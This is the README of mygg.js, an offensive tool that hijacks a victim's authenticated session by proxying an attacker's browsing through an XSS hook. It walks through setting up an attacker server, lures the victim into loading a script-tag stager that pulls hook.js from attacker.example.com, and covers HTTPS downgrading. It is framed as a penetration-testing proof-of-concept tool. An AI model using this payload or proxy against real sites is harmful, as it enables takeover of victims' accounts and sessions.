# mygg.js

mygg.js (Norwegian for mosquito) is a tool designed to hijack a victim's session by proxying web traffic through cross-site scripting. It allows an attacker to browse as though they were authenticated by the victim's browser. This is useful when you can't steal session cookies directly, but can still perform actions within the victim's session. By leveraging session riding, authentication tokens are automatically appended to each request, effectively acting as a man-in-the-middle. Inspired by tools like Mosquito, MalaRIA, and BeEF, mygg.js simplifies the process of session hijacking through XSS vulnerabilities.

<img src="https://github.com/dsolstad/mygg.js/blob/master/diagram.png" alt="drawing" width="698" height="320"/>

### How it works

1. **Set up the Server**: Ensure you have a server with a domain name pointing to it. This server will host the mygg.js application.
2. **Clone the Project**: Clone the mygg.js repository on your server. (Refer to the [Installation](#installation) section)
3. **Follow Installation Process**: Follow the steps in the [Installation](#installation) section to build and run the Docker container.
4. **Configure the Attacker's Browser**: Open a browser and set the proxy to `http://attacker.example.com:8081`.
5. **Generate Payloads**: Run the mygg.js application, which will print various payloads in the console. These payloads can be used for different XSS vectors.
6. **Inject Payload**: Inject one of the payloads into the XSS injection point on the target website and trick the victim into loading it.
7. **Victim Gets Hooked**: Once the victim loads the payload, their browser will be hooked and load the hook.js script.
8. **Monitor and Interact**: The attacker must browse to the target website through the proxy. Once the victim is hooked, the attacker can interact with the target website as though they are authenticated as the victim.

## Prerequisites

- Attacker server with Docker installed
- A domain that points to the attacker server
- The attacker's browser configured to use the proxy at `http://attacker.example.com:8081`

## Limitations
- **Same-Origin Policy:** `mygg.js` is primarily restricted to the domain where the hook was loaded. This means that you can only browse and interact with the site where the XSS payload was injected.
- **CORS Misconfigurations:** Some sites may have misconfigured Cross-Origin Resource Sharing (CORS) headers, like an open `access-control-allow-origin` header. These misconfigurations can allow cross-origin requests, potentially expanding what `mygg.js` can access.

## Installation

### 1. **Clone the Project:**

```bash
git clone https://github.com/root4loot/mygg.js.git
cd mygg.js
```

### 2. Run the Container:
```
docker build -t mygg .
docker run -d --name mygg -p 8443:8443 -e DOMAIN=attacker.example.com mygg
```
Replace **attacker.example.com** with your actual domain name.

## Configuration

The Docker container will automatically generate a Let's Encrypt certificate for the specified domain and renew it as needed. No manual certificate management is required.

## Payload Stager
When mygg.js is started, it will output various XSS payloads you may inject. Example payload:

```html
<script>
  var x=document.createElement('script');
  x.src='//attacker.example.com:8443/hook.js';
  document.head.appendChild(x);
</script>
```

## Ports

- **Port 8443** - Used for serving the hook, polling, and receiving responses over HTTPS.
- **Port 8081** - The proxy where you should configure your attacking web browser to proxy through, to forward communication to the hooked browser.


## Notes

- When configuring attacker browser to use the proxy on port 8081, make sure to use `http://` instead of `https://`.
- If the browser forces HTTPS, then make sure to clear the HSTS cache first.


# TODOs
- Consider implementing the use of WebSockets instead of HTTP polling.
- Consider implementing HTTPS interception instead of HTTPS downgrading.

# FAQ
**Q:** Why not use the other tools instead?  
**A:** Mosquito and MalaRIA are old and do not support HTTPS. BeEF is barely maintained and its XSS proxy is full of bugs.

# Disclaimer 
This software is only meant to be used for the purposes of creating proof-of-concepts during security assessments, to better demonstrate the risks of Cross-site Scripting, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.
  
This software is a personal project and not related with any companies, including Project owner and contributors employers.

# LICENSE
See [LICENSE](LICENSE)